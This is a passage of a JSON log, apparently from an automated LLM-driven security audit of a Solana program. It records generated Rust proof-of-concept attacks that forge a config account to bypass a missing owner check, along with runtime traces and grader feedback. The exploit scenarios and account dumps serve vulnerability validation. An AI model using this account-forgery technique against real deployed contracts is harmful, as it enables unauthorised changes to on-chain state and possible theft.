);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "update_fee legítimo",
+            "result": "Success",
+            "compute_units": 330,
+            "account_flags": "-w,sr",
+            "ix_head": "0115cd5b07000000",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "ad111c0f19000001",
+                "digest": "e42b6ba3be272484",
+                "post": "ad111c0f19000001000000000000000200000000000000000000000000000000000000000000000015cd5b0700000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_fee com config forjada",
+            "result": "UnknownError(ExternalAccountDataModified)",
+            "compute_units": 215,
+            "account_flags": "-w,sr",
+            "ix_head": "0115cd5b07000000",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "data_len": 48,
+                "head": "ad111c0f19000001",
+                "digest": "e42b6ba3be272484",
+                "post": "ad111c0f1900000100000000000000020000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 330 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 215 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: instruction modified data of an account it does not own"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o ataque parou com UnknownError(ExternalAccountDataModified), erro do runtime da Solana e nao do programa: o programa aceitou a entrada e tentou uma operacao que nenhum programa pode fazer (ex.: gravar em conta cujo dono e outro programa). Demonstre o dano por outra via, por exemplo uma decisao do programa tomada a partir dos dados da conta forjada, gravada numa conta que pertence a ele."
+    },
+    {
+      "attempt": 5,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3678,
+        "completion_tokens": 980,
+        "latency_s": 4.99
+      },
+      "raw": "{\"plan\": \"O ataque anterior foi aceito pelo programa mas o runtime bloqueou a escrita em conta de outro dono (ExternalAccountDataModified). Para demonstrar o dano sem violar a regra de owner, uso uma conta forjada cujo dono é o próprio programa-alvo (env.program_id) mas cujos dados foram forjados pelo atacante: o discriminador ADMIN_CONFIG_DISCRIMINATOR e a pubkey do atacante em 8..40. O baseline usa uma config legítima com o mesmo layout e o atacante como authority. O ataque passa a mesma config forjada (dono = programa-alvo, dados forjados) e o atacante como signer; se o programa aceitar, ele grava new_fee em 40..48 da conta forjada, provando que a autorização depende apenas do conteúdo dos dados e não de uma verificação de propriedade/estado legítimo.\", \"scenario\": \"let attacker = Pubkey::new_unique();\\nlet admin = attacker;\\nlet new_fee: u64 = 123456789;\\n\\nlet legit_config_key = Pubkey::new_unique();\\nlet forged_config_key = Pubkey::new_unique();\\n\\nlet mut legit_data = vec![0u8; 48];\\nlegit_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nlegit_data[8..40].copy_from_slice(admin.as_ref());\\nlegit_data[40..48].copy_from_slice(&0u64.to_le_bytes());\\nlet legit_config = account(&env.program_id, &legit_data, None);\\n\\nlet mut forged_data = vec![0u8; 48];\\nforged_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nforged_data[8..40].copy_from_slice(admin.as_ref());\\nforged_data[40..48].copy_from_slice(&0u64.to_le_bytes());\\nlet forged_config = account(&env.program_id, &forged_data, None);\\n\\nlet mut ix_data = vec![1u8];\\nix_data.extend_from_slice(&new_fee.to_le_bytes());\\n\\nlet baseline_metas = vec![\\n    AccountMeta::new(legit_config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n];\\nlet baseline_ix = env.raw_ix(&ix_data, baseline_metas);\\nlet baseline_accounts = vec![\\n    (legit_config_key, legit_config.clone()),\\n    (admin, wallet(1_000_000_000)),\\n];\\nlet _baseline_result = env.baseline(\\\"update_fee legítimo\\\", &baseline_ix, &baseline_accounts);\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(forged_config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n];\\nlet attack_ix = env.raw_ix(&ix_data, attack_metas);\\nlet attack_accounts = vec![\\n    (forged_config_key, forged_config),\\n    (admin, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"update_fee com config forjada\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let forged_after = after(&attack_result, &forged_config_key);\\n    env.effect(\\n        \\\"new_fee gravado na conta forjada cujos dados foram controlados pelo atacante\\\",\\n        read_u64(forged_after.data(), 40) == new_fee,\\n    );\\n    env.effect(\\n        \\\"admin lido dos dados forjados é a pubkey do atacante\\\",\\n        read_pubkey(forged_after.data(), 8) == attacker,\\n    );\\n}\\n\"}",
+      "plan": "O ataque anterior foi aceito pelo programa mas o runtime bloqueou a escrita em conta de outro dono (ExternalAccountDataModified). Para demonstrar o dano sem violar a regra de owner, uso uma conta forjada cujo dono é o próprio programa-alvo (env.program_id) mas cujos dados foram forjados pelo atacante: o discriminador ADMIN_CONFIG_DISCRIMINATOR e a pubkey do atacante em 8..40. O baseline usa uma config legítima com o mesmo layout e o atacante como authority. O ataque passa a mesma config forjada (dono = programa-alvo, dados forjados) e o atacante como signer; se o programa aceitar, ele grava new_fee em 40..48 da conta forjada, provando que a autorização depende apenas do conteúdo dos dados e não de uma verificação de propriedade/estado legítimo.",
+      "scenario": "let attacker = Pubkey::new_unique();\nlet admin = attacker;\nlet new_fee: u64 = 123456789;\n\nlet legit_config_key = Pubkey::new_unique();\nlet forged_config_key = Pubkey::new_unique();\n\nlet mut legit_data = vec![0u8; 48];\nlegit_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nlegit_data[8..40].copy_from_slice(admin.as_ref());\nlegit_data[40..48].copy_from_slice(&0u64.to_le_bytes());\nlet legit_config = account(&env.program_id, &legit_data, None);\n\nlet mut forged_data = vec![0u8; 48];\nforged_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nforged_data[8..40].copy_from_slice(admin.as_ref());\nforged_data[40..48].copy_from_slice(&0u64.to_le_bytes());\nlet forged_config = account(&env.program_id, &forged_data, None);\n\nlet mut ix_data = vec![1u8];\nix_data.extend_from_slice(&new_fee.to_le_bytes());\n\nlet baseline_metas = vec![\n    AccountMeta::new(legit_config_key, false),\n    AccountMeta::new_readonly(admin, true),\n];\nlet baseline_ix = env.raw_ix(&ix_data, baseline_metas);\nlet baseline_accounts = vec![\n    (legit_config_key, legit_config.clone()),\n    (admin, wallet(1_000_000_000)),\n];\nlet _baseline_result = env.baseline(\"update_fee legítimo\", &baseline_ix, &baseline_accounts);\n\nlet attack_metas = vec![\n    AccountMeta::new(forged_config_key, false),\n    AccountMeta::new_readonly(admin, true),\n];\nlet attack_ix = env.raw_ix(&ix_data, attack_metas);\nlet attack_accounts = vec![\n    (forged_config_key, forged_config),\n    (admin, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"update_fee com config forjada\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let forged_after = after(&attack_result, &forged_config_key);\n    env.effect(\n        \"new_fee gravado na conta forjada cujos dados foram controlados pelo atacante\",\n        read_u64(forged_after.data(), 40) == new_fee,\n    );\n    env.effect(\n        \"admin lido dos dados forjados é a pubkey do atacante\",\n        read_pubkey(forged_after.data(), 8) == attacker,\n    );\n}\n",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "update_fee legítimo",
+            "result": "Success",
+            "compute_units": 330,
+            "account_flags": "-w,sr",
+            "ix_head": "0115cd5b07000000",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "ad111c0f19000001",
+                "digest": "e42b6ba3be272484",
+                "post": "ad111c0f19000001000000000000000200000000000000000000000000000000000000000000000015cd5b0700000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_fee com config forjada",
+            "result": "Success",
+            "compute_units": 330,
+            "account_flags": "-w,sr",
+            "ix_head": "0115cd5b07000000",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "ad111c0f19000001",
+                "digest": "e42b6ba3be272484",
+                "post": "ad111c0f19000001000000000000000200000000000000000000000000000000000000000000000015cd5b0700000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "new_fee gravado na conta forjada cujos dados foram controlados pelo atacante",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "admin lido dos dados forjados é a pubkey do atacante",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 330 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 330 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o ataque nao exercita a hipotese de OWNER: e preciso que uma conta do ataque tem dono diferente da conta na mesma posicao do baseline. Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca."
+    }
+  ],
+  "case_id": "SSP-06-P-S",
+  "static_finding": {
+    "category": "OWNER",
+    "confidence": "high",
+    "evidence": "let data = config.try_borrow_data()?;\n\nlet discriminator: [u8; 8] = data[0..8]\n    .try_into()\n    .map_err(|_| ProgramError::InvalidInstructionData)?;\n\nif discriminator != ADMIN_CONFIG_DISCRIMINATOR {\n    return Err(ProgramError::Custom(ERR_WRONG_DISCRIMINATOR));\n}",
+    "explanation": "A conta `config` e recebida como `AccountInfo` e seus dados sao lidos e posteriormente modificados (`data[40..48].copy_from_slice(...)`) sem que haja qualquer verificacao de que `config.owner` pertence ao programa esperado. O unico controle e um discriminador de 8 bytes nos dados, que pode ser forjado por um atacante ao criar uma conta cujo owner e um programa malicioso (ou o proprio atacante) contendo o mesmo discriminador e a pubkey do admin no offset 8..40.",
+    "attack_hypothesis": "O atacante cria uma conta cujo owner e um programa sob seu controle, escreve o discriminador ADMIN_CONFIG_DISCRIMINATOR nos primeiros 8 bytes e a pubkey do atacante (que tambem assina a transacao) nos bytes 8..40. Ao passar essa conta forjada como `config` e a si mesmo como `authority`, o programa aceita a atualizacao e grava `new_fee` na conta forjada, contornando a logica de autorizacao baseada em owner."
+  }
+}
